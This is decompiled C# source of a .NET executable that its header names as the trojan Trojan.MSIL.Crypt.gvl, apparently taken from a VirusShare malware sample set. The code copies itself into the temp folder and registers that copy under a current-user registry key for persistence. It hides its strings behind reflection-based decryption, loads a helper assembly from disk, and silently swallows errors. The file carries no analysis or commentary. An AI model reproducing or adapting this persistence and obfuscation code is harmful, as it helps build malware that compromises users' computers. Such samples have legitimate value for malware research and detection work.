// Decompiled with JetBrains decompiler
// Type: 
// Assembly: 1a9ca88073c831d03e5ae28cc7566846, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C57E47F5-DC7E-4448-AA2F-A275B8AE3AB0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan.MSIL.Crypt.gvl-7aae8877da5362d35c61c92615da0602ef1cabe3faad9dfcf25f4e162bade1e9.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.IO;
using System.Reflection;
using System.Resources;

[StandardModule]
internal sealed class \u0006
{
  public static ResourceManager \u0002 = new ResourceManager(\u000E.\u0002(1911372053), Assembly.GetExecutingAssembly());
  public static string \u0003 = Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName;

  public static object \u0002()
  {
    try
    {
      if (Operators.CompareString(\u0006.\u0003, Path.GetTempPath() + \u0006.\u0002(\u000E.\u0002(1911372057), \u000E.\u0002(1911372094)), false) != 0)
      {
        File.Copy(\u0006.\u0003, Path.GetTempPath() + \u0006.\u0002(\u000E.\u0002(1911372057), \u000E.\u0002(1911372094)), true);
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\u0006.\u0002(\u000E.\u0002(1911372109), \u000E.\u0002(1911372170)), true);
        registryKey.SetValue(\u0006.\u0002(\u000E.\u0002(1911372185), \u000E.\u0002(1911372202)), (object) (Path.GetTempPath() + \u0006.\u0002(\u000E.\u0002(1911372057), \u000E.\u0002(1911372094))), RegistryValueKind.String);
        registryKey.Close();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    object obj;
    return obj;
  }

  public static string \u0002(string _param0, string _param1) => Conversions.ToString(Assembly.Load(File.ReadAllBytes(\u000E.\u0002(1911372217))).GetType(\u000E.\u0002(1911372233)).GetMethod(\u000E.\u0002(1911372256)).Invoke((object) null, new object[2]
  {
    (object) _param0,
    (object) _param1
  }));

  public static byte[] \u0002(byte[] _param0, string _param1) => (byte[]) Assembly.Load(File.ReadAllBytes(\u000E.\u0002(1911372217))).GetType(\u000E.\u0002(1911372233)).GetMethod(\u000E.\u0002(1911372285)).Invoke((object) null, new object[2]
  {
    (object) _param0,
    (object) _param1
  });
}
